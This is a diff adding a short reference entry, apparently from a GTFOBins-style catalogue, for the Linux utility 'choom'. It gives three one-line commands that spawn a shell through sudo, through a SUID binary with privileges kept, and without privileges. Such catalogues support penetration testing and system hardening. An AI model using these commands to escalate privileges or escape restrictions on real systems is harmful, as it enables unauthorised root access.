@@ -1,0 +1,14 @@
+choom
+=====
+
+Shell
+-----
+
+[Sudo]
+    choom -n 0 /bin/sh
+
+[SUID]
+    choom -n 0 -- /bin/sh -p
+
+[Unprivileged]
+    choom -n 0 /bin/sh
